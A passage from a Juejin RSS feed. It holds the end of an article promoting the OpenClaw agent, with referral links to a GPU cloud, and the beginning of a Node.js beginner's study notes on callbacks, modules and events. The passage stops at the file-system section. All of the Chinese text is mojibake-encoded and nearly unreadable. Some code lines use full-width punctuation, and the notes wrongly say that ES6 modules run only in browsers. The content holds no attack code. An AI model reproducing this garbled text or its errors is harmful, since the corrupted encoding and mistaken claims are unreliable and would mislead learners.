<p>é™¤äº†é»˜è®¤çš„ Claude/OpenAI æ¨¡å‹ï¼ŒOpenClaw æ¶æ„ä¹Ÿæ”¯æŒçµæ´»å¯¹æ¥å›½äº§å¤§æ¨¡å‹ï¼ˆå¦‚MinMaxç­‰ï¼‰ã€‚é€šå¸¸åªéœ€åœ¨é…ç½®ä¸­æ›¿æ¢å¯¹åº”çš„ API ç«¯ç‚¹ä¸å¯†é’¥ï¼Œå³å¯äº«å—å›½äº§æ¨¡å‹æœåŠ¡ï¼Œåœ¨æ•°æ®éšç§ä¸ç½‘ç»œå»¶è¿Ÿä¸Šæ›´å…·ä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-11">3.3 äº‘å¹³å°ä¸€ç«™å¼éƒ¨ç½²</h3>
<p>ç›®å‰ï¼Œ<strong>é˜¿é‡Œäº‘ã€ç«å±±å¼•æ“</strong>ç­‰ä¸»æµäº‘å¹³å°å·²æä¾›é¢„é›†æˆçš„ OpenClaw éƒ¨ç½²æ–¹æ¡ˆã€‚åœ¨å¯¹åº”çš„äº‘å¸‚åœºæˆ–AIå¹³å°æœåŠ¡ä¸­æœç´¢ â€œOpenClawâ€ï¼Œå³å¯æ‰¾åˆ°å®˜æ–¹æˆ–ç¤¾åŒºç»´æŠ¤çš„é•œåƒä¸éƒ¨ç½²æ¨¡æ¿ï¼Œå®ç°åˆ†é’Ÿçº§äº‘ç«¯ä¸Šçº¿ï¼Œéå¸¸é€‚åˆä¸æƒ³æŠ˜è…¾æœ¬åœ°ç¯å¢ƒçš„ç”¨æˆ·ã€‚</p>
<p><strong>å°è¯•éƒ¨ç½²å±äºå¤§å®¶çš„ OpenClawï¼Œå¼€å¯é«˜æ•ˆæ™ºèƒ½çš„â€œæ•°å­—å‘˜å·¥â€æ—¶ä»£å§ï¼</strong></p>
<h2 data-id="heading-12">å››ã€æ€»ç»“</h2>
<p>æœ¬æ–‡åˆ†äº«äº†OpenClawæ ¸å¿ƒç‰¹æ€§ä¸è®¾è®¡åŸç†ï¼Œå¹¶æä¾›äº†æ¥å…¥å›½äº§å¤§æ¨¡å‹ä¸ä¸»æµèŠå¤©å·¥å…·çš„å®ç”¨æŒ‡å—ã€‚OpenClawæ˜¯2026å¹´ç°è±¡çº§å¼€æºæ™ºèƒ½ä½“ï¼Œå®ƒé€šè¿‡ç‹¬ç‰¹çš„ç½‘å…³ç³»ç»Ÿå®ç°å…¨å¹³å°å®æ—¶äº¤äº’ï¼Œå‡­å€Ÿå››å±‚è®°å¿†æ¶æ„æ‹¥æœ‰é•¿æœŸè®°å¿†ä¸å­¦ä¹ èƒ½åŠ›ï¼Œå¹¶å€Ÿç”±Agent Skillsä½“ç³»çµæ´»æ‰©å±•åŠŸèƒ½æ­£å‘ç€æœªæ¥æ—¶ä»£çš„å…¨èƒ½æ•°å­—å‘˜å·¥è¿ˆè¿›ã€‚</p>
<p>2026æ³¨å®šæ˜¯å¤§æ¨¡å‹æ¥ç»­çˆ†å‘çš„ä¸€å¹´ï¼ä¸ºäº†è®©å¤§å®¶å½»åº•ææ‡‚å¤§æ¨¡å‹çš„ä½œç”¨åŸç†ï¼Œç¬”è€…ä¹Ÿå‘å¸ƒäº†<a href="https://juejin.cn/column/7594655863548248116" target="_blank" title="https://juejin.cn/column/7594655863548248116">ã€Šæ•°æ®åˆ°æ¨¡å‹åˆ°åº”ç”¨ï¼šå¤§æ¨¡å‹è®­ç»ƒå…¨æµç¨‹å®æˆ˜æŒ‡å—ã€‹</a>ä¸“æ ï¼Œé¢„è®¡ä¼šæœ‰50æœŸå†…å®¹ï¼Œå°†ç³»ç»Ÿæ‹†è§£ä»æ•°æ®å¤„ç†ã€æ¨¡å‹è®­ç»ƒåˆ°å¼ºåŒ–å­¦ä¹ ä¸æ™ºèƒ½ä½“å¼€å‘çš„å…¨æµç¨‹ï¼Œå¹¶å¸¦å¤§å®¶ä»é›¶å®ç°æ¨¡å‹ï¼Œå¸®åŠ©å¤§å®¶æŒæ¡å¤§æ¨¡å‹è®­ç»ƒçš„å…¨æŠ€èƒ½ï¼ŒçœŸæ­£æŒæ¡å¡‘é€ æ™ºèƒ½çš„èƒ½åŠ›ï¼æ„Ÿå…´è¶£å¤§å®¶å¯å…³æ³¨ç¬”è€…æ˜é‡‘è´¦å·ï¼Œæ›´å¯å…³æ³¨ç¬”è€…åŒåå¾®ä¿¡å…¬ä¼—å·ï¼š<strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œæ›´å¤šæ•™ç¨‹å’Œå¤§é‡å¤§æ¨¡å‹å­¦ä¹ èµ„æ–™åˆ†äº«~</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¤§æ¨¡å‹è®­ç»ƒå¯¹è®¡ç®—èµ„æºæœ‰ä¸€å®šè¦æ±‚ï¼Œå°¤å…¶æ˜¯GPUæ˜¾å­˜ã€‚ä¸ºé™ä½å­¦ä¹ é—¨æ§›ï¼Œç¬”è€…ä¸å›½å†…ä¸»æµäº‘å¹³å°åˆä½œï¼Œå¤§å®¶å¯ä»¥é€šè¿‡æ‰“å¼€é“¾æ¥:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lab4ai.cn%2Fregister%3FagentID%3Duser-XorgKKc56U" target="_blank" title="https://www.lab4ai.cn/register?agentID=user-XorgKKc56U" ref="nofollow noopener noreferrer">Lab4AI</a>Â ï¼Œä½“éªŒ<strong>H100 GPU 6.5å°æ—¶</strong>çš„ç®—åŠ›ã€‚æœ¬ç³»åˆ—æ‰€æœ‰å®æˆ˜æ•™ç¨‹å‡å°†åœ¨è¯¥å¹³å°ä¸Šå®Œæˆï¼Œå¸®åŠ©å¤§å®¶ä½æˆæœ¬ä¸Šæ‰‹å®è·µã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nodejs å­¦ä¹ è®°å½•]]></title>    <link>https://juejin.cn/post/7602401081265946660</link>    <guid>https://juejin.cn/post/7602401081265946660</guid>    <pubDate>2026-02-03T12:22:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602401081265946660" data-draft-id="7602401081264652324" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nodejs å­¦ä¹ è®°å½•"/> <meta itemprop="keywords" content="Node.js"/> <meta itemprop="datePublished" content="2026-02-03T12:22:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸´åœ¨linzai"/> <meta itemprop="url" content="https://juejin.cn/user/974584529557604"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nodejs å­¦ä¹ è®°å½•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/974584529557604/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸´åœ¨linzai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:22:20.000Z" title="Tue Feb 03 2026 12:22:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.Nodejsçš„ä¼˜ç‚¹å’Œç¯å¢ƒæ­å»º</h2>
<h3 data-id="heading-1">Nodejsçš„ä¼˜ç‚¹</h3>
<ol>
<li>è¿è¡Œåœ¨v8JavaScriptå¼•æ“ä¸Š(é«˜æ€§èƒ½)</li>
<li>äº‹ä»¶é©±åŠ¨</li>
<li>éé˜»å¡çš„IOæ¨¡å‹</li>
<li>ä¸°å¯Œçš„ç”Ÿæ€åœˆ(npmä¸‹è½½èµ„æº)</li>
</ol>
<h3 data-id="heading-2">Nodejsçš„å®‰è£…</h3>
<p>ç‚¹å‡» <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fdownload" target="_blank" title="https://nodejs.org/en/download" ref="nofollow noopener noreferrer">Node.js â€” Download Node.jsÂ®</a> å®‰è£…æ–°ç‰ˆæœ¬çš„nodejs</p>
<h2 data-id="heading-3">2.å…¨å±€å¯¹è±¡</h2>
<p>Nodejsæä¾›å¾ˆå¤šå…¨å±€å¯¹è±¡,è¿™äº›å¯¹è±¡éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨,ä¸éœ€è¦åšå•ç‹¬çš„å¼•å…¥</p>
<p><strong>æ—¥å¿—ä¿¡æ¯æ‰“å°</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'nihao'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'nihao'</span>);
</code></pre>
<p><strong>å®šæ—¶å™¨</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>
<span class="hljs-keyword">let</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
   i += <span class="hljs-number">1</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'i = '</span> + i )
   <span class="hljs-keyword">if</span>(i &gt;= <span class="hljs-number">5</span>){
       <span class="hljs-built_in">clearInterval</span>(timer)
   }
}, <span class="hljs-number">1000</span>);
</code></pre>
<p><strong>ä¸€äº›å¸¸ç”¨çš„å…¨å±€å¯¹è±¡</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>ï¼ˆ__dirname)ï¼›<span class="hljs-comment">//æ‰“å°å‡ºæ¥å½“å‰è·¯å¾„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>ï¼ˆ__filenameï¼‰ï¼›<span class="hljs-comment">//æ‰“å°å‡ºæ¥åŒ…å«æ–‡ä»¶åç§°</span>
</code></pre>
<h2 data-id="heading-4">3.å›è°ƒå‡½æ•°</h2>
<p><strong>å®šä¹‰</strong>:æ˜¯æŒ‡ä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶åœ¨è¯¥å‡½æ•°å†…éƒ¨è¢«è°ƒç”¨çš„å‡½æ•°ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦ç†Ÿæ‚‰ä¸€ä¸‹å›è°ƒå‡½æ•°,å› ä¸ºåœ¨æ•´ä¸ªnodejsä¸­,æ…¢æ…¢çš„éƒ½æ˜¯å›è°ƒå‡½æ•°</p>
<p><strong>åŸºç¡€å‡½æ•°</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"hi"</span>);
}

<span class="hljs-keyword">let</span>  sayBye = <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name + <span class="hljs-string">"bye"</span>);
}
<span class="hljs-title function_">sayHi</span>()
<span class="hljs-title function_">sayBye</span>(<span class="hljs-string">"hzh"</span>)
</code></pre>
<p><strong>å›è°ƒå‡½æ•°</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">callFunction</span>(<span class="hljs-params">callback,name</span>){
    <span class="hljs-title function_">callback</span>(name);
}

<span class="hljs-title function_">callFunction</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name + <span class="hljs-string">":bye"</span>);
},<span class="hljs-string">"hzh"</span>)
</code></pre>
<h2 data-id="heading-5">4.æ¨¡å—(Commonjsè§„èŒƒ)</h2>
<p>åœ¨JavaScriptçš„ES5ç‰ˆæœ¬ä¸­,æœ€å¤§çš„é—®é¢˜å°±æ˜¯æ²¡æœ‰æ¨¡å—çš„æ¦‚å¿µ,ä½†æ˜¯nodejsä¸­,å¢åŠ äº†commonjsè§„èŒƒæ¥å¤„ç†è¿™ä¸€é—®é¢˜</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//utils.js</span>
<span class="hljs-keyword">let</span> adder = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'ä¸¤æ•°ä¹‹å’Œä¸º '</span> + (a + b);
}

<span class="hljs-keyword">let</span> arrLength = <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'é•¿åº¦ä¸º '</span> + arr.<span class="hljs-property">length</span>;
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    adder,
    arrLength
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//code.js</span>
<span class="hljs-keyword">const</span> {<span class="hljs-attr">adder</span>: add,<span class="hljs-attr">arrLength</span>: length} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./utils.js'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">length</span>([ <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> ]));
</code></pre>
<h3 data-id="heading-6"><strong>æ‹“å±•</strong></h3>
<p>export ä¹Ÿå¯ä»¥ç›´æ¥å¯¼å‡ºæ–‡ä»¶,è¿™æ˜¯<strong>ES6æ¨¡å—</strong>,å’ŒCommonjsè¿˜æ˜¯åŒºåˆ«çš„</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//utils.js</span>
<span class="hljs-keyword">let</span> adder = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'ä¸¤æ•°ä¹‹å’Œä¸º '</span> + (a + b);
}

<span class="hljs-keyword">let</span> arrLength = <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-string">'é•¿åº¦ä¸º '</span> + arr.<span class="hljs-property">length</span>;
}

<span class="hljs-keyword">export</span> {adder,arrLength};
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//code.js</span>
<span class="hljs-keyword">import</span> {adder,arrLength} <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils.js'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">adder</span>(<span class="hljs-number">10</span>,<span class="hljs-number">30</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">arrLength</span>([ <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> ]));
</code></pre>
<p><strong>ES6ç‰¹ç‚¹</strong>:</p>
<ul>
<li><strong>ä»£ç åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œ</strong></li>
<li><strong>æ— æ³•ç›´æ¥è®¿é—®æœåŠ¡å™¨èµ„æº</strong>ï¼ˆæ–‡ä»¶ç³»ç»Ÿã€æ•°æ®åº“ç­‰ï¼‰</li>
<li><strong>é€šè¿‡ç½‘ç»œè¯·æ±‚ä¸æœåŠ¡å™¨é€šä¿¡</strong></li>
<li><strong>ä¸»è¦è´Ÿè´£ç”¨æˆ·ç•Œé¢å’Œäº¤äº’</strong></li>
</ul>
<p><strong>Commonjsç‰¹ç‚¹</strong>:</p>
<ul>
<li><strong>ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ</strong></li>
<li><strong>å¯ä»¥ç›´æ¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿã€æ•°æ®åº“ç­‰</strong></li>
<li><strong>å¤„ç†ä¸šåŠ¡é€»è¾‘ã€æ•°æ®å­˜å‚¨ç­‰</strong></li>
<li><strong>å‘æµè§ˆå™¨æä¾›APIæœåŠ¡</strong></li>
</ul>
<p>åˆ°åé¢åŸºæœ¬éƒ½æ˜¯ç»Ÿä¸€ä½¿ç”¨ES6æ¨¡å—å¼€å‘,åœ¨package.jsonæ–‡ä»¶ä¸­åŠ å…¥</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// package.json</span>
{
  <span class="hljs-string">"type"</span>: <span class="hljs-string">"module"</span>
}
</code></pre>
<h2 data-id="heading-7">5.äº‹ä»¶</h2>
<p>å¤§å¤šæ•°Node.jsæ ¸å¿ƒAPIæ„å»ºæƒ¯ç”¨å¼‚æ­¥äº‹ä»¶é©±åŠ¨æ¶æ„,å…¶ä¸­æŸäº›ç±»å‹çš„å¯¹è±¡(åˆç§°è§¦å‘å™¨,Emitter)ä¼šè§¦å‘å‘½åäº‹ä»¶æ¥è°ƒç”¨å‡½æ•°(åˆç§°ç›‘å¬å™¨,Listener)</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//å¼•å…¥äº‹ä»¶</span>
<span class="hljs-keyword">let</span> enents  =  <span class="hljs-built_in">require</span>(<span class="hljs-string">"events"</span>);
<span class="hljs-comment">//åˆ›å»ºäº‹ä»¶å‘å°„å™¨å¯¹è±¡</span>
<span class="hljs-keyword">let</span> eventEmitter = <span class="hljs-keyword">new</span> enents.<span class="hljs-title class_">EventEmitter</span>();
<span class="hljs-comment">//ç»‘å®šäº‹ä»¶åŠäº‹ä»¶å¤„ç†ç¨‹åº</span>
eventEmitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">"someEvent"</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">arg1</span>){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"someEvent äº‹ä»¶è§¦å‘"</span>,arg1);
});
<span class="hljs-comment">//è§¦å‘äº‹ä»¶</span>
eventEmitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"someEvent"</span>,<span class="hljs-string">"hzh"</span>);
</code></pre>
<p>é™¤äº†ç›´æ¥ä½¿ç”¨,æˆ‘ä»¬è¿˜å¯ä»¥ç»§æ‰¿äº‹ä»¶</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> events = <span class="hljs-built_in">require</span>(<span class="hljs-string">"events"</span>);
<span class="hljs-keyword">let</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">"util"</span>);

<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ„é€ å‡½æ•°</span>
<span class="hljs-keyword">let</span> <span class="hljs-title class_">Person</span> =  <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>){
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}   

<span class="hljs-comment">//è®©Personç»§æ‰¿äº‹ä»¶å‘å°„å™¨ inherits(ç»§æ‰¿,è¢«ç»§æ‰¿)</span>
util.<span class="hljs-title function_">inherits</span>(<span class="hljs-title class_">Person</span>,events.<span class="hljs-property">EventEmitter</span>);

<span class="hljs-comment">//åˆ›å»ºpersonå¯¹è±¡</span>
<span class="hljs-keyword">let</span> hzh = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"hzh"</span>);
<span class="hljs-keyword">let</span> yj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"yj"</span>);
<span class="hljs-comment">//åˆ›å»ºæ•°ç»„å­˜æ”¾personå¯¹è±¡</span>
<span class="hljs-keyword">let</span>  personArr = [hzh,yj];
<span class="hljs-comment">//ç»‘å®šäº‹ä»¶åŠäº‹ä»¶å¤„ç†ç¨‹åº</span>
personArr.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">person</span>){
    person.<span class="hljs-title function_">on</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"hello my name is "</span>+ person.<span class="hljs-property">name</span> + <span class="hljs-string">":"</span> + message);
    }); 
});
<span class="hljs-comment">//è§¦å‘äº‹ä»¶</span>
hzh.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">'å¸…æ°”'</span>);
yj.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">"èå½¼"</span>);
</code></pre>
<h3 data-id="heading-8">æ‹“å±•</h3>
<p>ä¸Šé¢çš„æ˜¯es5ä¹‹å‰ç‰ˆæœ¬çš„å†™æ³•äº†,å’±ä»¬åç»­åŸºæœ¬ä½¿ç”¨es6è¯­æ³•å¼€å‘,ä¸‹é¢æ˜¯es6çš„å†™æ³•,å¯¹æ¯”ä¹‹å‰ç‰ˆæœ¬çš„ä¼˜ç‚¹:<strong>æ›´åŠ çš„æ¸…æ™°</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EventEmitter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"events"</span>);
<span class="hljs-comment">// ä½¿ç”¨ extend ç›´æ¥ç»§æ‰¿ EventEmitter</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">EventEmitter</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-variable language_">super</span>();<span class="hljs-comment">//es6æ–°ç‰¹æ€§</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }
}

<span class="hljs-comment">//åˆ›å»ºpersonå¯¹è±¡</span>
<span class="hljs-keyword">let</span> hzh = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"hzh"</span>);
<span class="hljs-keyword">let</span> yj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"yj"</span>);
<span class="hljs-comment">//åˆ›å»ºæ•°ç»„å­˜æ”¾personå¯¹è±¡</span>
<span class="hljs-keyword">let</span>  personArr = [hzh,yj];
<span class="hljs-comment">//ç»‘å®šäº‹ä»¶åŠäº‹ä»¶å¤„ç†ç¨‹åº</span>
personArr.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">person</span>){
    person.<span class="hljs-title function_">on</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>){
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"hello my name is "</span>+ person.<span class="hljs-property">name</span> + <span class="hljs-string">":"</span> + message);
    }); 
});
<span class="hljs-comment">//è§¦å‘äº‹ä»¶</span>
hzh.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">'å¸…æ°”'</span>);
yj.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"sayHello"</span>,<span class="hljs-string">"èå½¼"</span>);
</code></pre>
<h2 data-id="heading-9">6.æ–‡ä»¶è¯»å†™</h2>
<p>åœ¨Nodejsä¸­æœ‰æ–‡ä»¶ç³»ç»Ÿï¼Œæ˜¯å¯¹æœ¬åœ°æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œï¼Œå½“ç„¶ï¼Œå¦‚æœè¦ä½¿ç”¨æˆ‘ä»¬éœ€è¦å¼•å…¥fså¯¹è±¡</p>
